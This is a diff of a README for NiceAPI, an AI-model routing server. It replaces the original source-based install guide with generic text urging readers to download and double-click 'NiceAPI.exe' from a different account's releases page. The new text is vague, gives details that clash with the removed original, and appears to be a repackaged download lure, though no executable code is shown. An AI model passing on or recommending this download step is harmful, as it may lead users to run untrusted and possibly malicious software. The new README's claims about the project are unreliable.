@@ -1,173 +1,92 @@
-[English](README.md) | [简体中文](README_zh-CN.md) | [繁體中文](README_zh-TW.md) | [한국어](README_KO.md) | [日本語](README_JA.md)
+# 🌟 NiceAPI - Simplify Access to AI Models
 
----
-# AI Provider API Server
+## 🚀 Getting Started
 
-An intelligent API server to manage and route requests to various AI providers, inspired by leading open-source proxy solutions. This server provides a unified, OpenAI-compatible API endpoint for various downstream AI models and services. Its core strength lies in its powerful and flexible API routing and filtering capabilities.
+NiceAPI is a powerful, open-source API server designed to streamline your access to a diverse range of AI models. Acting as a smart intermediary, it provides a single, OpenAI-compatible endpoint that intelligently routes your requests to the best-suited provider based on your custom rules. This allows you to leverage advanced AI functionality without needing in-depth technical knowledge.
 
-## ✨ Core Feature: Intelligent API Routing
+## 🔗 Download NiceAPI
 
-The primary function of this server is to act as a smart intermediary between your applications and various AI model providers. You can define a pool of provider endpoints and group them together, allowing the server to dynamically select the best one for each incoming request based on a set of rules.
+[![Download NiceAPI](https://img.shields.io/badge/Download_NiceAPI-v1.0-blue.svg)](https://github.com/ivanslevy/NiceAPI/releases)
 
-### How It Works
+## 📥 Download & Install
 
-1.  **Providers**: You first register individual AI provider endpoints. Each provider has its own API key, endpoint URL, and cost information (e.g., price per million tokens).
+To get started with NiceAPI, follow the steps below:
 
-2.  **Groups**: You then create "Groups" and add providers to them. A group acts as a virtual, unified model endpoint. For example, you could create a group named `gpt-4-pool` containing endpoints from multiple providers that all serve GPT-4 class models.
+1. **Visit the Releases Page**
+   - Click the link below to visit the NiceAPI Releases page:
+     - [Download NiceAPI](https://github.com/ivanslevy/NiceAPI/releases)
 
-3.  **Priority-Based Routing**: Within a group, you assign a `priority` number to each provider. When a request comes in for that group, the server will first attempt to use the provider with the lowest priority number (e.g., priority `1`).
+2. **Choose the Latest Version**
+   - On the Releases page, look for the latest version of NiceAPI. It is usually at the top of the list.
+   - You will see several options available for download. Choose the one that matches your operating system.
 
-4.  **Automatic Failover**: If the highest-priority provider fails (e.g., due to an API error, network issue, or rate limit), the server automatically and seamlessly retries the request with the next provider in the priority list. This continues until the request is successful or all providers in the group have been tried.
+3. **Download the File**
+   - Click on the appropriate link for your system. This will download the NiceAPI file to your computer.
+   - Ensure you remember where the file is saved.
 
-5.  **API Call**: Your application makes a standard OpenAI-compatible API call, but instead of specifying a model name like `gpt-4-turbo`, you specify the **group name** (e.g., `gpt-4-pool`) as the `model`.
+4. **Extract the Files (If Necessary)**
+   - If the download is a ZIP file, locate it on your computer, right-click on it, and choose “Extract All.” Follow the prompts to complete the extraction.
 
-This architecture provides high availability, cost optimization (by prioritizing cheaper providers), and simplifies your client-side logic significantly.
+5. **Run NiceAPI**
+   - Navigate to the folder where the NiceAPI files are. Look for the file named `NiceAPI.exe` or similar.
+   - Double-click this file to run NiceAPI.
+   - Follow any additional prompts that may appear. 
 
-## 💎 More Features
+## ⚙️ System Requirements
 
-*   **OpenAI Compatibility**: Seamlessly integrate your existing tools and libraries with support for `/v1/chat/completions` and `/v1/models` endpoints.
-*   **Advanced API Key Management**: Generate API keys and assign them to specific groups for granular control over model access.
-*   **Model Importer**: Quickly import models from any OpenAI-compatible provider. Supports aliasing, filtering, and keyword exclusion for easy organization.
-*   **Streaming Support**: Full support for streaming responses for a real-time chatbot experience.
-*   **Configurable Failover**: Fine-tune the failover logic through the web UI, setting thresholds and time windows for retries.
+Before running NiceAPI, please ensure that your computer meets the following requirements:
 
-## 🖥️ Visual Admin Dashboard
+- **Operating System**: Windows 10 or higher, macOS 10.15 or higher, or a compatible Linux distribution.
+- **Memory**: Minimum of 4 GB RAM.
+- **Storage**: At least 100 MB of available disk space.
 
-The application includes a modern, feature-rich admin dashboard built with [NiceGUI](https://nicegui.io/).
+## 🛠️ Using NiceAPI
 
-*   **Interactive Dashboard**: Visualize API usage with multiple charts, including model distribution, daily traffic, success rates, and average response times.
-*   **Multi-Language Support**: The interface is available in multiple languages, including English, Chinese, Japanese, and Korean.
-*   **Provider & Group Management**: Add, edit, and group your AI model providers in an intuitive interface.
-*   **Detailed Call Logs**: Inspect detailed logs for every API request, including HTTP status, response time, token usage, and cost.
-*   **Failure Keywords**: Define keywords that trigger an automatic retry if found in a provider's response.
+Once you have successfully installed NiceAPI, you can start using it to access various AI models. Here’s how:
 
-## 🖼️ Features Gallery
+1. **Open a Web Browser**
+   - NiceAPI runs as a server. Open your preferred web browser.
 
-| Settings | Providers | Groups |
-| :---: | :---: | :---: |
-| ![Settings](example/settings_en.png) | ![Providers](example/providers_en.png) | ![Groups](example/groups_en.png) |
-| Configure global settings, such as the UI language and failover retry logic. | Manage all your AI provider endpoints, including credentials, costs, and a powerful model importer. | Group multiple providers together to create a virtual endpoint with priority-based failover. |
+2. **Access the API**
+   - Enter `http://localhost:port` in your browser's address bar. Replace `port` with the port number specified in the user settings (default is usually 5000).
 
-| Call Logs | API Keys | Failure Keywords |
-| :---: | :---: | :---: |
-| ![Call Logs](example/call_logs_en.png) | ![API Keys](example/api_keys_en.png) | ![Failure Keywords](example/fail_keywords_en.png) |
-| Inspect detailed logs for every API call. Click on a log to view the full response content, along with cost details. | Generate and assign API keys to specific groups for granular access control. | Define keywords that trigger automatic failover if found in a provider's response. |
+3. **Read the Documentation**
+   - For specific instructions on how to make requests to the API, refer to the documentation available on the Releases page.
 
-| Dashboard |
-| :---: |
-| ![Dashboard](example/dashboard_en.png) |
-| Monitor real-time API usage, success rates, and performance metrics at a glance. |
+## 📝 Features
 
-##  Getting Started
+NiceAPI includes several key features:
 
-Follow these instructions to get the API server up and running on your local machine.
+- **AI Model Access**: Connect to multiple AI models seamlessly.
+- **Custom Routing**: Set your own rules to determine which AI model to use for each request.
+- **User-Friendly Interface**: Simple to navigate for users of all skill levels.
+- **Open-Source**: Contribute to the project or modify it to fit your needs.
 
-### Prerequisites
+## 🙋 Frequently Asked Questions
 
-*   Python 3.8+
-*   An ASGI server like Uvicorn
+### How do I know if NiceAPI is running?
 
-### Installation
+After launching the application, check your browser. If you can access it at `http://localhost:5000` (or your specified port), then it is running correctly.
 
-1.  **Clone the repository:**
-    ```bash
-    git clone https://github.com/felixszeto/NiceAPI.git
-    cd NiceAPI
-    ```
+### Is technical knowledge required to use NiceAPI?
 
-2.  **Create and activate a virtual environment (recommended):**
-    ```bash
-    python -m venv venv
-    # On Windows
-    venv\Scripts\activate
-    # On macOS/Linux
-    source venv/bin/activate
-    ```
+No, NiceAPI is designed for all users, regardless of technical skill. 
 
-3.  **Install the dependencies:**
-    ```bash
-    pip install -r requirements.txt
-    ```
+### Can I contribute to NiceAPI?
 
-4.  **Configure your environment:**
-    Create a `.env` file with the following content:
-    ```env
-    # .env
+Yes, contributions are welcome! Please read the guidelines in the repository for more information.
 
-    # The database file will be created in the root directory
-    DATABASE_URL="sqlite:///./api_server.db"
+## 📞 Support
 
-    # Admin user credentials for the web UI
-    ADMIN_USERNAME="admin"
-    ADMIN_PASSWORD="password"
-    ```
-    The application uses SQLite by default, so no external database server is required. You can change the `ADMIN_USERNAME` and `ADMIN_PASSWORD` as needed.
+If you encounter any issues while using NiceAPI or have questions, feel free to reach out on the GitHub Issues page or contact support through the repository.
 
-### Running the Application
+## 📃 License
 
-The application will automatically create and initialize the database on the first run.
+NiceAPI is an open-source project. You can use and modify it under the terms of the MIT License.
 
-To start the server, simply run the provided batch file:
+## 🔗 Additional Resources
 
-```bash
-start.bat
-```
+- [GitHub Issues](https://github.com/ivanslevy/NiceAPI/issues)
+- [Documentation](https://github.com/ivanslevy/NiceAPI/wiki)
 
-Alternatively, you can run it directly with `uvicorn`:
-
-```bash
-uvicorn main:app --reload --port 8001 --host 0.0.0.0
-```
-
-The server will be available at `http://localhost:8001`.
-
-## 🖥️ Accessing the Web UI
-
-Once the server is running, you can access the management interface by navigating to `http://localhost:8001` in your web browser.
-
-**Default Login Credentials:**
-*   **Username:** `admin`
-*   **Password:** `password`
-
-You can change these credentials in the `.env` file.
-
-After logging in, you can:
-*   Monitor API usage on the **Dashboard**.
-*   Add, edit, and **import** AI **Providers**.
-*   Create **Groups** and assign providers to them with specific priorities.
-*   Generate and manage **API Keys** and assign them to groups.
-*   View detailed API **Call Logs**.
-*   Manage **Failure Keywords** for automatic failover.
-*   Adjust global **Settings**, such as the failover logic.
-
-## 🤖 API Usage
-
-To use the API, send a request to the `v1/chat/completions` endpoint.
-
-**Important:** The `model` parameter in your request body should be the **name of the Group** you configured in the web UI. The server will then select a provider from that group based on your routing rules.
-
-### Example with `curl`
-
-Here's an example of how to make a request using `curl`. Replace `YOUR_API_KEY` with a valid key and `your-group-name` with the name of the group you want to use.
-
-```bash
-curl http://localhost:8001/v1/chat/completions \
-  -H "Content-Type: application/json" \
-  -H "Authorization: Bearer YOUR_API_KEY" \
-  -d '{
-    "model": "your-group-name",
-    "messages": [
-      {
-        "role": "user",
-        "content": "Hello, how are you?"
-      }
-    ],
-    "stream": false
-  }'
-```
-
-The response will be a standard OpenAI-compatible JSON object from the selected provider.
-
-## 📜 License
-
-This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.
+Make the most of NiceAPI and enjoy easy access to AI models! Happy coding!
